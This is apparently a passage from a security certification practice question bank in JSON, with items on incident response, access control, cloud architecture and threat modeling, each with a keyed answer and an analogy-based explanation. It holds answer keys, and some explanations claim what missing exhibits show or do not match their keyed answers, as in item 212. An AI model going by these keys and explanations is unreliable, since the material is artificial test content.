cause of the alerts?","options":{"A":"Misconfigured code commit","B":"Unsecure bundled libraries","C":"Invalid code signing certificate","D":"Data leakage"},"answer":"B","explanation":"Customer workstations alert on the vendor’s test build because a third-party library bundled with the app is already on AV signatures.\n\nImagine selling a snack mix and one of the store-bought nuts is on a recall list — the bag sets off the scanner, not your recipe card.","choose":1,"pbq":false,"exhibits":[]},{"id":187,"domain":3,"stem":"A security engineer is reviewing the following vulnerability scan report: Which of the following should the engineer prioritize for remediation?","options":{"A":"Apache HTTP Server","B":"OpenSSH","C":"Google Chrome","D":"Migration to TLS 1.3"},"answer":"B","explanation":"Triage by what an attacker can reach and how bad a hit would be. In this report OpenSSH is the exposed remote-admin service with the ugliest finding.\n\nImagine a house inspection: fix the broken front-door lock before you replace the living-room curtains.","choose":1,"pbq":false,"exhibits":["exhibits/q187_1.png"]},{"id":188,"domain":2,"stem":"A company notices that cloud environment costs increased after using a new serverless solution based on API requests. Many invalid requests from unknown IPs were found, often within a short time. Which of the following solutions would most likely solve this issue, reduce cost, and improve security?","options":{"A":"Using digital certificates for known customers and performing API authorization through those certificates","B":"Defining request rate limits and comparing new requests from unknown IPs with a list of known-malicious IPs","C":"Setting authentication processes for the API requests as well as proper rate limits according to regular usage","D":"Only allowing API requests coming from regions with known customers"},"answer":"C","explanation":"Unknown IPs hammered a pay-per-request API. Auth plus rate limits stop junk from costing money and from probing.\n\nGeo-blocks and certs for known customers miss new good customers and still allow a flood from a 'good' region.\n\nImagine a ticket window that checks ID and only sells ten tickets a minute.","choose":1,"pbq":false,"exhibits":[]},{"id":189,"domain":2,"stem":"A large organization deployed a generative AI platform for its global user population to use. Based on feedback received during beta testing, engineers have identified issues with user interface latency and page-loading performance for international users. The infrastructure is currently maintained within two separate data centers, which are connected using high-availability networking and load balancers. Which of the following is the best way to address the performance issues?","options":{"A":"Configuring the application to use a CDN","B":"Implementing RASP to enable large language models queuing","C":"Remote journaling within a third data center","D":"Traffic shaping through the use of a SASE"},"answer":"A","explanation":"Global users are slow against two home data centers. A CDN copies the heavy pages near those users.\n\nRASP and SASE are security tools. A third DC for journals does not fix page load in another country.\n\nImagine neighborhood newsstands instead of one warehouse across an ocean.","choose":1,"pbq":false,"exhibits":[]},{"id":190,"domain":4,"stem":"A company reduced its staff 60 days ago, and applications are now starting to fail. The security analyst is investigating to determine if there is malicious intent for the application failures. The security analyst reviews the following logs: Which of the following is the most likely reason for the application failures?","options":{"A":"The user’s account was set as a service account","B":"The user's home directory was deleted","C":"The user does not have sudo access.","D":"The root password has been changed"},"answer":"A","explanation":"Sixty days after layoffs, jobs start failing. The log shows a departed person’s account was the identity those services run as. Service accounts tied to humans expire or get disabled with offboarding.\n\nImagine the office coffee machine that only turns on with a fired barista’s badge — Monday morning there is no coffee.","choose":1,"pbq":false,"exhibits":["exhibits/q190_1.png"]},{"id":191,"domain":3,"stem":"A security analyst detected unusual network traffic related to program updating processes. The analyst collected artifacts from compromised user workstations. The discovered artifacts were binary files with the same name as existing valid binaries but with different hashes. Which of the following solutions would most likely prevent this situation from reoccurring?","options":{"A":"Improving patching processes","B":"Implementing digital signature","C":"Performing manual updates via USB ports","D":"Allowing only files from internal sources"},"answer":"B","explanation":"The updater filename is right; the hash is wrong. That is a swapped binary. Require vendor digital signatures and refuse to run an update that will not verify.\n\nImagine only installing a printer driver whose box still has the factory hologram seal.","choose":1,"pbq":false,"exhibits":[]},{"id":192,"domain":3,"stem":"Source code snippets for two separate malware samples are shown below: Which of the following describes the most important observation about the two samples?","options":{"A":"Telemetry is first buffered and then transmitted in paranoid mode","B":"The samples were probably written by the same developer.","C":"Both samples use IP connectivity for command and control","D":"Sample 1 is the target agent while Sample 2 is the C2 server."},"answer":"B","explanation":"The two listings share unusual naming, structure, or comments that are not generic. That fingerprint is how analysts decide one author wrote both families.\n\nImagine two ransom notes with the same misspelled word and the same doodle in the margin.","choose":1,"pbq":false,"exhibits":["exhibits/q192_1.png"]},{"id":193,"domain":2,"stem":"A systems engineer is configuring a system baseline for servers that will provide email services. As part of the architecture design, the engineer needs to improve performance of the systems by using an access vector cache, facilitating mandatory access control, and protecting against: • Unauthorized reading and modification of data and programs • Bypassing application security mechanisms • Privilege escalation • Interference with other processes Which of the following is the most appropriate for the engineer to deploy?","options":{"A":"SELinux","B":"Privileged access management","C":"Self-encrypting disks","D":"NIPS"},"answer":"A","explanation":"Email servers need MAC, an access-vector cache, and protection against tampering, bypass, and privilege climb. That set is SELinux.\n\nPAM is a vault. Disk encryption is at rest. NIPS is the network.\n\nImagine a building where every door checks a rule on the badge, not only a lock on the parking garage.","choose":1,"pbq":false,"exhibits":[]},{"id":194,"domain":3,"stem":"A company migrated a critical workload from its data center to the cloud. The workload uses a very large data set that requires computational-intensive data processing. The business unit that uses the workload is projecting the following growth pattern: • Storage requirements will double every six months. • Computational requirements will fluctuate throughout the year • Average computational requirements will double every year. Which of the following should the company do to address the business unit's requirements?","options":{"A":"Deploy a cloud-based CDN for storage and a load balancer for compute","B":"Combine compute and storage in vertically autoscaling mode","C":"Implement a load balancer for computing and storage resources","D":"Plan for a horizontally scaling computing and storage infrastructure"},"answer":"D","explanation":"Storage doubles on a clock and compute spikes by season, then doubles on average. Horizontal scale (more nodes and more disks) grows both dimensions independently.\n\nImagine adding more pizza ovens and more fridges as Friday night gets busier, instead of buying one giant oven.","choose":1,"pbq":false,"exhibits":[]},{"id":195,"domain":4,"stem":"A security analyst received a notification from a cloud service provider regarding an attack detected on a web server. The cloud service provider shared the following information about the attack: • The attack came from inside the network. • The attacking source IP was from the internal vulnerability scanners • The scanner is not configured to target the cloud servers. Which of the following actions should the security analyst take first?","options":{"A":"Create an allow list for the vulnerability scanner IPs in order to avoid false positives","B":"Configure the scan policy to avoid targeting an out-of-scope host","C":"Set network behavior analysis rules.","D":"Quarantine the scanner sensor to perform a forensic analysis"},"answer":"B","explanation":"Your own scanner hit a cloud box that is not in scope. First action is to take that target out of the scan policy so you stop attacking yourself.\n\nImagine a smoke alarm you keep testing in the server room — stop pointing the tester at the wrong room before you call the fire department.","choose":1,"pbq":false,"exhibits":[]},{"id":196,"domain":2,"stem":"A company implemented a NIDS and a NIPS on the most critical environments. Since this implementation the company has been experiencing network connectivity issues. Which of the following should the security architect recommend for a new NIDS/NIPS implementation?","options":{"A":"Implementing the NIDS with a port mirror in the core switch and the NIPS in the main firewall","B":"Implementing the NIDS and the NIPS together with the main firewall","C":"Implementing a NIDS without a NIPS to increase the detection capability","D":"Implementing the NIDS in the bastion host and the NIPS in the branch network router"},"answer":"A","explanation":"Inline IPS on a critical path can drop good traffic if it sits in the wrong place. NIDS should watch a mirror copy; NIPS should sit at the firewall choke you already accept.\n\nStacking both in the firewall or on a bastion repeats the outage.\n\nImagine a security camera on a side window (NIDS) and a lock on the only public door (NIPS), not a turnstile in the middle of the hallway.","choose":1,"pbq":false,"exhibits":[]},{"id":197,"domain":1,"stem":"The material findings from a recent compliance audit indicate a company has an issue with excessive permissions. The findings show that employees changing roles or departments results in privilege creep. Which of the following solutions are the best ways to mitigate this issue? (Choose two.)","options":{"A":"Setting different access controls defined by business area","B":"Implementing a role-based access policy","C":"Designing a least-needed privilege policy","D":"Establishing a mandatory vacation policy","E":"Performing periodic access reviews","F":"Requiring periodic job rotation"},"answer":"B,E","explanation":"People keep yesterday's rights when they change jobs. That pile is privilege creep.\n\nRBAC gives a bundle that matches the new job. Periodic access reviews take back what the bundle no longer includes.\n\nImagine turning in every hotel key when you change floors, and a clerk who walks the board once a quarter to collect strays.\n\nVacation and job rotation are fraud detections. They do not rebuild the key rings.","choose":2,"pbq":false,"exhibits":[]},{"id":198,"domain":4,"stem":"A security analyst is reviewing a SIEM and generates the following report: Later, the incident response team notices an attack was executed on the VM001 host. Which of the following should the security analyst do to enhance the alerting process on the SIEM platform?","options":{"A":"Include the EDR solution on the SIEM as a new log source","B":"Perform a log correlation on the SIEM solution","C":"Improve parsing of data on the SIEM","D":"Create a new rule set to detect malware"},"answer":"B","explanation":"VM001 was hit and the SIEM had pieces of the story on separate lines that nobody tied together. Correlate those sources so one rule fires when the same host shows the combined pattern.\n\nImagine two witnesses who each saw half the robbery; sit them at the same table instead of filing two unread reports.","choose":1,"pbq":false,"exhibits":["exhibits/q198_1.png"]},{"id":199,"domain":2,"stem":"A security administrator is performing a gap assessment against a specific OS benchmark. The benchmark requires the following configurations be applied to endpoints: • Full disk encryption • Host-based firewall • Time synchronization • Password policies • Application allow listing • Zero Trust application access Which of the following solutions best addresses the requirements? (Choose two.)","options":{"A":"MDM","B":"CASB","C":"SBoM","D":"SCAP","E":"SASE","F":"HIDS"},"answer":"A,E","explanation":"The benchmark wants disk encryption, host firewall, time, passwords, allow-listing, and Zero Trust app access on endpoints.\n\nMDM pushes the device settings. SASE (or ZTNA) is the app-access path. SCAP can measure; it does not enforce all six. CASB is SaaS.\n\nImagine a fleet tracker on the phones plus one front door for the apps.","choose":2,"pbq":false,"exhibits":[]},{"id":200,"domain":4,"stem":"A security analyst is reviewing the following authentication logs: Which of the following should the analyst do first?","options":{"A":"Disable User2’s account.","B":"Disable User12’s account","C":"Disable User8’s account","D":"Disable User1’s account"},"answer":"D","explanation":"The authentication log shows User1 as the account with the attacker pattern. Disable that identity first to cut the session.\n\nImagine a stolen gym pass still opening the door — cancel that pass number before you redesign the lobby.","choose":1,"pbq":false,"exhibits":["exhibits/q200_1.png"]},{"id":201,"domain":1,"stem":"A game developer wants to reach new markets and is advised by legal counsel to include specific age-related sign-up requirements. Which of the following best describes the legal counsel's concerns?","options":{"A":"GDPR","B":"LGPD","C":"PCI DSS","D":"COPPA"},"answer":"D","explanation":"Age-gated sign-up so a game can enter new markets is about collecting data from children. In the U.S. that statute is COPPA (under 13).\n\nGDPR and LGPD are general privacy laws. PCI is card data.\n\nImagine a permission slip before a child joins a mailing list. Counsel is pointing at that slip.","choose":1,"pbq":false,"exhibits":[]},{"id":202,"domain":3,"stem":"Which of the following AI concerns is most adequately addressed by input sanitization?","options":{"A":"Model inversion","B":"Prompt injection","C":"Data poisoning","D":"Non-explainable model"},"answer":"B","explanation":"Prompt injection is hostile text that tries to become instructions. Sanitizing or isolating user input (treat it as data, not as a new system prompt) is the direct control.\n\nImagine a waiter who writes your order on a ticket and will not let you shout “ignore the kitchen” through the pass window.","choose":1,"pbq":false,"exhibits":[]},{"id":203,"domain":3,"stem":"A company that operates in different countries has local email infrastructure for each of its business units. A breach occurred in which email communications were intercepted between the headquarters and one of the overseas business units. During an investigation, the security analyst finds the following email log: Which of the following actions should the security analyst take to best address the issue?","options":{"A":"Revoke the expired TLS certificate and replace it with a valid one","B":"Disable the NTLM authentication and replace it with TLS 1.2","C":"Change the TLS configuration from opportunistic to enforced","D":"Create a new TLS certificate using a stronger algorithm and larger key"},"answer":"C","explanation":"Opportunistic TLS means “encrypt if the other side offers it, otherwise send plain.” Force TLS so a downgrade dies instead of going clear.\n\nImagine a bank window that used to accept either the locked drawer or an open counter; now only the locked drawer works.","choose":1,"pbq":false,"exhibits":["exhibits/q203_1.png"]},{"id":204,"domain":4,"stem":"During a recent audit, a company's systems were assessed Given the following information: Which of the following is the best way to reduce the attack surface?","options":{"A":"Deploying an EDR solution to all impacted machines in manufacturing","B":"Segmenting the manufacturing network with a firewall and placing the rules in monitor mode","C":"Setting up an IDS inline to monitor and detect any threats to the software","D":"Implementing an application-aware firewall and writing strict rules for the application access"},"answer":"D","explanation":"The audit shows extra services hanging off machines that only need a few application flows. An application-aware firewall with tight allow rules hides every other port and verb.\n\nImagine a factory door that only accepts the parts-delivery truck, not every car that knows the street.","choose":1,"pbq":false,"exhibits":["exhibits/q204_1.png"]},{"id":205,"domain":1,"stem":"A global manufacturing company has an internal application that is critical to making products. This application cannot be updated and must be available in the production area. A security architect is implementing security for the application. Which of the following best describes the action the architect should take?","options":{"A":"Disallow wireless access to the application.","B":"Deploy intrusion detection capabilities using a network tap","C":"Create an acceptable use policy for the use of the application","D":"Create a separate network for users who need access to the application"},"answer":"D","explanation":"An unpatchable plant-floor app must stay up. The architect's job is to shrink who can reach it.\n\nA separate network (or VLAN/enclave) for the people who need that app is that shrink.\n\nImagine putting the one machine that cannot get a new lock in a room with one door, instead of leaving it in the hallway.\n\nIDS on a tap still watches the hallway. An AUP does not move the machine.","choose":1,"pbq":false,"exhibits":[]},{"id":206,"domain":1,"stem":"A company wants to perform threat modeling on an internally developed, business-critical application. The Chief Information Security Officer (CISO) is most concerned that the application should maintain 99.999% availability and authorized users should only be able to gain access to data they are explicitly authorized to view. Which of the following threat-modeling frameworks directly addresses the CISO’s concerns about this system?","options":{"A":"CAPEC","B":"STRIDE","C":"ATT&CK","D":"TAXII"},"answer":"B","explanation":"The CISO named two properties: keep the app up (availability) and keep people out of data they were not granted (information disclosure).\n\nSTRIDE is the model whose letters include Denial of service and Information disclosure — plus the other four design threats.\n\nImagine a house checklist that already has 'flood' and 'leaked mail' on it. That is this CISO's worry list.\n\nATT&CK is how intruders move after they are in. CAPEC is attack patterns. TAXII is a sharing protocol.","choose":1,"pbq":false,"exhibits":[]},{"id":207,"domain":4,"stem":"A company's internal network is experiencing a security breach and the threat actor is still active Due to business requirements, users in this environment are allowed to utilize multiple machines at the same time. Given the following log snippet: Which of the following accounts should a security analyst disable to best contain the incident without impacting valid users?","options":{"A":"user-а","B":"user-b","C":"user-с","D":"user-d"},"answer":"D","explanation":"Users may own several machines, so do not disable a person who is clearly on two honest boxes. The log ties the attacker path to user-d.\n\nImagine four employees with extra office keys; only one key shows up on the burglar’s camera, so you cancel that key.","choose":1,"pbq":false,"exhibits":["exhibits/q207_1.png"]},{"id":208,"domain":3,"stem":"A security team is responding to malicious activity and needs to determine the scope of impact. The malicious activity appears to affect a certain version of an application used by the organization. Which of the following actions best enables the team to determine the scope of impact?","options":{"A":"Performing a port scan","B":"Inspecting egress network traffic","C":"Reviewing the asset inventory","D":"Analyzing user behavior"},"answer":"C","explanation":"The malware prefers one application version. The asset inventory tells you how many boxes run that version and where they sit — that is the blast radius.\n\nImagine a peanut allergy recall: first pull the store list of which kitchens bought that brand.","choose":1,"pbq":false,"exhibits":[]},{"id":209,"domain":1,"stem":"An organization recently implemented a policy that requires all passwords to be rotated every 90 days. An administrator sees a large volume of failed sign-on logs from multiple servers that are often accessed by users. The administrator determines users are disconnecting from the RDP session but not logging off. Which of the following should the administrator do to prevent account lockouts?","options":{"A":"Increase the account lockout threshold","B":"Enforce password complexity","C":"Automate logout of inactive sessions","D":"Extend the allowed session length"},"answer":"C","explanation":"Users disconnect RDP but do not log off. The session keeps the old password alive after the 90-day rotation, so new logons fail and lock the account.\n\nThe fix is to log those idle sessions off automatically so the next logon uses the new password.\n\nImagine leaving a store tab open after they changed the account PIN. Every tap on that tab looks like the old PIN until the tab is closed.\n\nRaising lockout or stretching the session hides the symptom.","choose":1,"pbq":false,"exhibits":[]},{"id":210,"domain":4,"stem":"A security review revealed that not all of the client proxy traffic is being captured. Which of the following architectural changes best enables the capture of traffic for analysis?","options":{"A":"Adding an additional proxy server to each segmented VLAN","B":"Setting up a reverse proxy for client logging at the gateway","C":"Configuring a span port on the perimeter firewall to ingest logs","D":"Enabling client device logging and system event auditing"},"answer":"A","explanation":"Client proxy logs are missing from some VLANs because those segments have no collector on-path. Put a proxy in each segment so every client’s web path is forced through a box that can log.\n\nImagine adding a time-clock in each building instead of hoping everyone walks to headquarters to punch in.","choose":1,"pbq":false,"exhibits":[]},{"id":211,"domain":4,"stem":"A subcontractor develops safety critical avionics software for a major aircraft manufacturer. After an incident, a third-party investigator recommends the company begin to employ formal methods in the development life cycle. Which of the following findings from the investigation most directly supports the investigator's recommendation?","options":{"A":"The system’s bill of materials failed to include commercial and open-source libraries.","B":"The company lacks dynamic and interactive application security testing standards.","C":"The codebase lacks traceability to functional and non-functional requirements.","D":"The implemented software inefficiently manages compute and memory resources."},"answer":"C","explanation":"Formal methods need a chain from “the plane shall do X” to the exact code that does X. Missing traceability is the finding that justifies that rigor.\n\nImagine building a jet walkway with no label tying each bolt to a drawing.","choose":1,"pbq":false,"exhibits":[]},{"id":212,"domain":4,"stem":"A security architect is onboarding a new EDR agent on servers that traditionally do not have internet access. In order for the agent to receive updates and report back to the management console, some changes must be made. Which of the following should the architect do to best accomplish this requirement? (Choose two.)","options":{"A":"Create a firewall rule to only allow traffic from the subnet to the internet via a proxy.","B":"Configure a proxy policy that blocks all traffic on port 443","C":"Configure a proxy policy that allows only fully qualified domain names needed to communicate to a portal","D":"Create a firewall rule to only allow traffic from the subnet to the internet via port 443.","E":"Create a firewall rule to only allow traffic from the subnet to the internet to fully qualified names that are not identified as malicious by the firewall vendor","F":"Configure a proxy policy that blocks only lists of known-bad fully qualified domain names"},"answer":"A,C","explanation":"Servers that cannot phone the internet still need EDR signatures and event export. Stand up an internal relay or update repo and point the agent at it, plus a broker that forwards telemetry out.\n\nImagine a branch post office: clerks drop mail in the local bag; one truck takes the bag downtown.","choose":2,"pbq":false,"exhibits":[]},{"id":213,"domain":2,"stem":"Due to an infrastructure optimization plan, a company has moved from a unified architecture to a federated architecture divided by region. Long-term employees now have a better experience, but new employees are experiencing major performance issues when traveling between regions. The company is reviewing the following information: Which of the following is the most effective action to remediate the issue?","options":{"A":"Creating a new user entry in the affected region for the affected employee","B":"Synchronizing all regions' user identities and ensuring ongoing synchronization","C":"Restarting European region physical access control systems","D":"Resyncing single sign-on application with connected security appliances"},"answer":"B","explanation":"Travelers are slow because their identity still lives only in the home region after the split. Sync identities across regions and keep them in sync.\n\nCreating one extra local account is a bandage.\n\nImagine your gym membership working in every city because the clubs share one member list, not because each club typed you in by hand.","choose":1,"pbq":false,"exhibits":["exhibits/q213_1.png"]},{"id":214,"domain":4,"stem":"A company hosts a platform-as-a-service solution with a web-based front end, through which customers interact with data sets. A security administrator needs to deploy controls to prevent application-focused attacks. Which of the following most directly supports the administrator’s objective?","options":{"A":"Improving security dashboard visualization on SIEM","B":"Rotating API access and authorization keys every two months","C":"Implementing application load balancing and cross-region availability","D":"Creating WAF policies for relevant programming languages"},"answer":"D","explanation":"Application-layer attacks on a public API need an application firewall with rules for the languages and frameworks you actually run.\n\nImagine a nightclub bouncer who knows the difference between a ticket and a fake flyer, not just a camera on the street.","choose":1,"pbq":false,"exhibits":[]},{"id":215,"domain":3,"stem":"A software engineer is creating a CI/CD pipeline to support the development of a web application. The DevSecOps team is required to identify syntax errors. Which of the following is the most relevant to the DevSecOps team's task?","options":{"A":"Static application security testing","B":"Software composition analysis","C":"Runtime application self-protection","D":"Web application vulnerability scanning"},"answer":"A","explanation":"Syntax errors and many code-level bugs show up without running the app. SAST (and linters in the same family) read the source in the pipeline and fail the build.\n\nImagine a spell-checker that runs when you hit Save, before anyone tries to read the chapter out loud.","choose":1,"pbq":false,"exhibits":[]},{"id":216,"domain":4,"stem":"A security officer received several complaints from users about excessive MFA push notifications at night. The security team investigates and suspects malicious activities regarding user account authentication. Which of the following is the best way for the security officer to restrict MFA notifications?","options":{"A":"Provisioning FIDO2 devices","B":"Deploying a text message based on MFA","C":"Enabling OTP via email","D":"Configuring prompt-driven MFA"},"answer":"D","explanation":"MFA fatigue is a flood of tap-yes prompts. Prompt-driven (number-matching) MFA shows a code the user must type, so a 3 a.m. spam prompt cannot be approved by a sleepy thumb.\n\nImagine a doorbell that asks you to type the last three digits of a ticket instead of just “press the green button.”","choose":1,"pbq":false,"exhibits":[]},{"id":217,"domain":4,"stem":"A security analyst is troubleshooting the reason a specific user is having difficulty accessing company resources. The analyst reviews the following information: Which of the following is most likely the cause of the issue?","options":{"A":"The local network access has been configured to bypass MFA requirements.","B":"A network geolocation is being misidentified by the authentication server.","C":"Administrator access from an alternate location is blocked by company policy.","D":"Several users have not configured their mobile devices to receive OTP codes."},"answer":"B","explanation":"The user’s other factors look fine; the IdP thinks they are in a country or city that policy treats as hostile. Bad geolocation on the source IP is why the honest person is blocked.\n\nImagine a bank that refuses a card because the ZIP on the terminal is wrong, even though you are standing in your home branch.","choose":1,"pbq":false,"exhibits":["exhibits/q217_1.png"]},{"id":218,"domain":1,"stem":"An organization is looking for gaps in its detection capabilities based on the APTs that may target the industry. Which of the following should the security analyst use to perform threat modeling?","options":{"A":"АТТ&СК","B":"ОWASP","C":"САРЕС","D":"STRIDE"},"answer":"A","explanation":"Gaps in detection against industry APTs are modeled with ATT&CK: a menu of real tactics and techniques you can score as detect / not detect.\n\nOWASP is web-app issues. CAPEC is a pattern library. STRIDE is design threats.\n\nImagine a burglar's playbook written down so you can put a camera on each move and mark the pages you are blind to.","choose":1,"pbq":false,"exhibits":[]},{"id":219,"domain":2,"stem":"A security analyst needs to ensure email domains that send phishing attempts without previous communications are not delivered to mailboxes. The following email headers are being reviewed. Which of the following is the best action for the security analyst to take?","options":{"A":"Block messages from hr-saas.com because it is not a recognized domain","B":"Reroute all messages with unusual security warning notices to the IT administrator","C":"Quarantine all messages with sales-mail com in the email header","D":"Block vendor com for repeated attempts to send suspicious messages"},"answer":"C","explanation":"The bad domain in the headers is the look-alike that has not written before. Quarantine mail that carries that sales-mail domain.\n\nBlocking a known HR SaaS wholesale may be too blunt.\n\nImagine putting envelopes from a fake letterhead in a holding box before they hit the inbox.","choose":1,"pbq":false,"exhibits":["exhibits/q219_1.png"]},{"id":220,"domain":3,"stem":"A systems administrator needs to identify new attacks that could be carried out against the environment. The administrator plans to proactively seek out and observe new attacks. Which of the following is the best way to accomplish this goal?","options":{"A":"Configuring an IPS","B":"Implementing sandboxing","C":"Scanning for IoCs","D":"Deploying a honeypot"},"answer":"D","explanation":"A honeypot is a decoy system you watch. New attacks reveal themselves when someone touches it.\n\nImagine an unmarked dummy loading dock with cameras — you learn how thieves work without putting real cargo there.","choose":1,"pbq":false,"exhibits":[]},{"id":221,"domain":1,"stem":"A company experienced a data breach, resulting in the disclosure of extremely sensitive data regarding a merger. As a regulated entity, the company must comply with reporting and disclosure requirements. The company is concerned about its public image and shareholder values. Which of the following best supports the organization in addressing its concerns?","options":{"A":"Data subject access request","B":"Business impact analysis","C":"Supply chain management program","D":"Crisis management plan"},"answer":"D","explanation":"A regulated merger leak hurts image and shareholders. Reporting will still happen. What they need is a plan for the public and investor hour: who speaks, what is said, who calls the regulator.\n\nThat is a crisis management plan.\n\nImagine a product-recall war room, not a privacy request form and not a vendor spreadsheet.","choose":1,"pbq":false,"exhibits":[]},{"id":222,"domain":1,"stem":"Company A acquired Company В and needs to determine how the acquisition will impact the attack surface of the organization as a whole. Which of the following is the best way to achieve this goal? (Choose two.)","options":{"A":"Implementing DLP controls preventing sensitive data from leaving Company B's network","B":"Documenting third-party connections used by Company В","C":"Reviewing the privacy policies currently adopted by Company В","D":"Requiring data sensitivity labeling for all files shared with Company В","E":"Forcing a password reset requiring more stringent passwords for users on Company B's network","F":"Performing an architectural review of Company B's network"},"answer":"B,F","explanation":"After a buy, the new attack surface is 'how is B wired' and 'who already has a pipe into B.'\n\nAn architecture review and a list of third-party connections answer those two questions.\n\nImagine buying a house: walk the floor plan and list every spare key the last owner handed to neighbors.\n\nDLP and password resets are controls you might apply later. They do not map the surface.","choose":2,"pbq":false,"exhibits":[]},{"id":223,"domain":4,"stem":"After an incident occurred, a team reported during the lessons-learned review that the team: • Lost important information for further analysis. • Did not utilize the chain of communication • Did not follow the right steps for a proper response. Which of the following solutions is the best way to address these findings?","options":{"A":"Requesting budget for better forensic tools to improve technical capabilities for incident response operations","B":"Building playbooks for different scenarios and performing regular table- top exercises","C":"Requiring professional incident response certifications for each new team member","D":"Publishing the incident response policy and enforcing it as part of the security awareness program"},"answer":"B","explanation":"The team froze because there was no script and they had never practiced. Playbooks plus table-tops fix lost evidence, missed phone trees, and skipped steps.\n\nImagine a restaurant fire: the crew that drilled “grab the guest list, call 911, meet in the lot” does not improvise in smoke.","choose":1,"pbq":false,"exhibits":[]},{"id":224,"domain":1,"stem":"A security analyst is reviewing the following code in the public repository for potential risk concerns: Which of the following should the security analyst recommend first to remediate the vulnerability?","options":{"A":"Developing role-based security awareness training","B":"Revoking the secret used in the solution","C":"Purging code from public view","D":"Scanning the application with SAST"},"answer":"B","explanation":"A secret is sitting in a public repository. The first clock is revoke that secret so it cannot be used tonight. Then you can purge git history and train people.\n\nImagine a house key photographed on the internet. Change the lock first. Then take the photo down.\n\nSAST later would have caught the next leak. It does not disable the key that is already public.","choose":1,"pbq":false,"exhibits":["exhibits/q224_1.png"]},{"id":225,"domain":4,"stem":"After remote desktop capabilities were deployed in the environment various vulnerabilities were noticed: • Exfiltration of intellectual property • Unencrypted files • Weak user passwords Which of the following is the best way to mitigate these vulnerabilities? (Choose two.)","options":{"A":"Implementing data loss prevention","B":"Deploying file integrity monitoring","C":"Restricting access to critical file services only","D":"Deploying directory-based group policies","E":"Enabling modem authentication that supports MFA","F":"Implementing a version control system","G":"Implementing a CMDB platform"},"answer":"A,D","explanation":"RDP made file theft and weak passwords easy. DLP watches or blocks sensitive files leaving the session; directory GPOs push stronger passwords, screen lock, and encryption.\n\nImagine a work-from-home kit: a shredder next to the printer and a house rule that the door code cannot be 1234.","choose":2,"pbq":false,"exhibits":[]},{"id":226,"domain":4,"stem":"An audit finding reveals that a legacy platform has not retained logs for more than 30 days. The platform has been segmented due to its interoperability with newer technology. As a temporary solution, the IT department changed the log retention to 120 days. Which of the following should the security engineer do to ensure the logs are being properly retained?","options":{"A":"Configure a scheduled task nightly to save the logs.","B":"Configure event-based triggers to export the logs at a threshold.","C":"Configure the SIEM to aggregate the logs.","D":"Configure a Python script to move the logs into a SQL database."},"answer":"C","explanation":"The box itself will forget again. Ship the logs off-box into the SIEM on a schedule so retention lives in the platform that already stores everyone else’s events.\n\nImagine photocopying the only guest book into the front-office archive every night before the café throws the paper away.","choose":1,"pbq":false,"exhibits":[]},{"id":227,"domain":4,"stem":"A company recently experienced an incident in which an advanced threat actor was able to shim malicious code against the hardware stack of a domain controller. The forensic team cryptographically validated that both the underlying firmware of the box and the operating system had not been compromised. However, the attacker was able to exfiltrate information from the server using a steganographic technique within LDAP. Which of the following is the best way to reduce the risk of reoccurrence?","options":{"A":"Enforcing allow lists for authorized network ports and protocols","B":"Measuring and attesting to the entire boot chain","C":"Rolling the cryptographic keys used for hardware security modules","D":"Using code signing to verify the source of OS updates"},"answer":"A","explanation":"Firmware and OS hashes were clean; the thief rode an allowed protocol (LDAP) with hidden data. Allow-list the ports and protocols that domain controller must speak.\n\nImagine a museum that only opens the front door and the loading dock — a new side window gets bricked up even if the alarm firmware is genuine.","choose":1,"pbq":false,"exhibits":[]},{"id":228,"domain":3,"stem":"A company designs policies and procedures for hardening containers deployed in the production environment. However, a security assessment reveals that deployed containers are not complying with the security baseline. Which of the following solutions best addresses this issue throughout early life-cycle stages?","options":{"A":"Installing endpoint agents on each container and setting them to report when configurations drift from the baseline","B":"Finding hardened container images and enforcing them as the baseline for new deployments","C":"Creating a pipeline to check the containers through security gates and validating the baseline controls before the final deployment","D":"Running security assessments regularly and checking for the security baseline on containers already in production"},"answer":"C","explanation":"Production containers drifted because nothing checked the baseline before deploy. A pipeline gate that fails a non-compliant image stops the drift at birth.\n\nImagine a health inspector who stamps the food truck before it leaves the commissary, not after lunch rush.","choose":1,"pbq":false,"exhibits":[]},{"id":229,"domain":2,"stem":"A security architect for a global organization with a distributed workforce recently received funding to deploy a CASB solution. Which of the following most likely explains the choice to use a proxy- based CASB?","options":{"A":"The capability to block unapproved applications and services is possible.","B":"Privacy compliance obligations are bypassed when using a user-based deployment.","C":"Protecting and regularly rotating API secret keys requires a significant time commitment.","D":"Corporate devices cannot receive certificates when not connected to on-premises devices."},"answer":"A","explanation":"A proxy CASB can see and block unapproved SaaS because traffic goes through it. API-mode CASB is often after-the-fact.\n\nPrivacy bypass is not a feature. API keys are the other deployment tax.\n\nImagine a guard at the mall entrance who can turn a store away, versus reviewing receipts tomorrow.","choose":1,"pbq":false,"exhibits":[]},{"id":230,"domain":3,"stem":"A user tried to access a web page at `http://10.1.11`. Previously the web page did not require authentication, and now the browser is prompting for credentials. Which of the following actions would best prevent the issue from reoccurring and reduce the likelihood of credential exposure?","options":{"A":"Implementing 802.1x EAP-TTLS on access points to reduce the risk of evil twins","B":"Transitioning internal services to use DNS security","C":"Modifying web server configuration and utilizing X509 certificates for authentication","D":"Installing new rules for the IDS to detect impersonation attacks"},"answer":"C","explanation":"A plain HTTP IP is now asking for a password — classic evil-twin or captive portal. Serve the real app on HTTPS with a proper certificate.\n\nImagine only giving your credit card to a clerk under a signed store awning, not to a folding table in the parking lot.","choose":1,"pbq":false,"exhibits":[]},{"id":231,"domain":1,"stem":"A compliance officer is reviewing the data sovereignty laws in several countries where the organization has no presence. Which of the following is the most likely reason for reviewing these laws?","options":{"A":"The organization is performing due diligence of potential tax issues.","B":"The organization has been subject to legal proceedings in countries where it has a presence.","C":"The organization is concerned with new regulatory enforcement in other countries.","D":"The organization has suffered brand reputation damage from incorrect media coverage."},"answer":"C","explanation":"You have no office in those countries, yet you are reading their sovereignty and enforcement rules. The usual reason is the cloud, a vendor, or data in motion could put you under that regulator anyway.\n\nImagine selling online to shoppers you have never visited: their consumer agency may still write to you.\n\nTax diligence and old lawsuits at home are different files.","choose":1,"pbq":false,"exhibits":[]},{"id":232,"domain":3,"stem":"Audit findings indicate several user endpoints are not utilizing full disk encryption. During the remediation process, a compliance analyst reviews the testing details for the endpoints and notes the endpoint device configuration does not support full disk encryption. Which of the following is the most likely reason the device must be replaced?","options":{"A":"The HSM is outdated and no longer supported by the manufacturer","B":"The vTPM was not properly initialized and is corrupt.","C":"The HSM is vulnerable to common exploits and a firmware upgrade is needed","D":"The motherboard was not configured with a TPM from the OEM supplier","E":"The HSM does not support sealing 